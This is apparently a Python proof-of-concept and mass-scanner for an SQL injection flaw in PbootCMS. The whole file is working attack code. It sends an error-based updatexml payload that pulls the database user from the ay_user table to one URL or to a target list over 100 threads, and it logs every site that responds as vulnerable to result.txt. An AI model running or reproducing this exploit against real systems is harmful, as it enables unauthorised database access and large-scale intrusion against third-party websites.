import requests, argparse, sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description='PbootCMS domain SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')


def poc(target):
    payload = '/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Content-Length': '8'
    }
    data = {
        '1':'select'.encode('utf-8')
        }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    }
    try:
        res = requests.post(url=target + payload, headers=headers, data=data, verify=False)
        if res.status_code == 404 and '执行SQL发生错误！' in res.text:
            # print(res.text)
            print(f'[+]存在漏洞：{target}')
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

if __name__ == '__main__':
    main()